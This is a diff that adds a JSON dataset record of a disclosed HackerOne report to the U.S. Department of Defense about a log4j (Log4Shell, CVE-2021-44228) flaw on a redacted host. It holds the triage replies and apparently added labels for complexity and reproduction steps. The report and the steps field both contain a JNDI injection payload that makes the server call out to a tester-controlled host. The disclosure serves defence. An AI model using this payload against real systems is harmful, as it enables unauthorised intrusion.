@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "alex_gaynor ",
+  "title": "\u2588\u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 running a vulnerable log4j",
+  "content": "\nReport\nDescription:\nhttps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228\nImpact\nProbably arbitrary code execution\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE Numbers\nCVE-2021-44228\nSteps to Reproduce\nBrowse to https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588https%3A%2F%2F\u2588\u2588\u2588%2F\nEnter a ${jndi:ldap://dns-server-yoi-control/a} into the username field\nEnter a random password\nSubmit\nObserve that a request was made to your DNS server. This strongly suggests a vulnerable log4j.\nSuggested Mitigation/Remediation Actions\nUpdate log4j or disable jndi support.\nActivity Timeline\n2021-12-10 18:16 (-0600) (comment)\nGreetings from the Department of Defense (DoD),\nThank you for supporting the DoD Vulnerability Disclosure Program (VDP).\nBy submitting this report, you acknowledge understanding of, and agreement to, the DoD Vulnerability Disclosure Policy as detailed at @DeptofDefense.\nThe VDP Team will review your report to ensure compliance with the DoD Vulnerability Disclosure Policy. If your report is determined to be out-of-scope, it will be closed without action.\nWe will attempt to validate in-scope vulnerability reports and may request additional information from you if necessary. We will forward reports with validated vulnerabilities to DoD system owners for their action.\nOur goal is to provide you with status updates not less than every two weeks until the reported vulnerability is resolved.\nRegards,\nThe VDP Team\n\n2021-12-13 08:29 (-0600): @agent-l8 (report severity updated)\nnull\n\n2021-12-13 08:29 (-0600): @agent-l8 (bug triaged)\nGreetings,\nWe have validated the vulnerability you reported and are preparing to forward this report to the affected DoD system owner for resolution.\nThank you for bringing this vulnerability to our attention!\nWe will endeavor to answer any questions the system owners may have regarding this report; however, there is a possibility we will need to contact you if they require more information to resolve the vulnerability.\nYou will receive another status update after we have confirmed your report has been resolved by the system owner. If you have any questions, please let me know.\nThanks again for supporting the DoD Vulnerability Disclosure Program.\nRegards,\nThe VDP Team\n\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Use of Externally-Controlled Format String"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1642638900,
+  "report_url": "https://hackerone.com/reports/1438393",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Browse to the target URL and enter a malicious JNDI string (e.g., ${jndi:ldap://dns-server-yoi-control/a}) into the username field."
+    ],
+    [
+      2,
+      "Submit the form and observe if a request is made to the specified DNS server, indicating a vulnerable log4j instance."
+    ]
+  ],
+  "vuln_description": "The vulnerability involves exploiting a known issue in log4j (CVE-2021-44228) where a malicious JNDI string can trigger arbitrary code execution via LDAP requests. This is a widespread and well-documented vulnerability affecting many systems using log4j for logging.",
+  "reason": "The attack is straightforward and involves a single, well-documented payload. The steps to reproduce are simple and do not require understanding complex interactions or manipulating application states. The vulnerability is widely known, making its discovery less challenging.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves exploiting a vulnerable log4j instance by injecting a malicious payload into a username field, which is not directly related to authentication or authorization bypass within the same application. The methodology described focuses on swapping user sessions or resource IDs within the same application context, which does not apply here.",
+    "is_detectable": false
+  }
+}
